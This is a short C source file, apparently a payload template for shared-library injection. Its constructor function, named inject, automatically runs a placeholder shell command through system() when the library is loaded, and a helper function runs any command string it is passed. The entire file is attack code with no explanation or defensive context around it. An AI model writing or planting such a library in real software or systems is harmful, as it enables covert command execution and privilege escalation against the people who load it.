#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
static void inject_cmd(char *cmd);

void inject(void) {
    int status;
    status = system("{command}");    
}

void inject_cmd(char *cmd) {
    int status;
    status = system(cmd);
}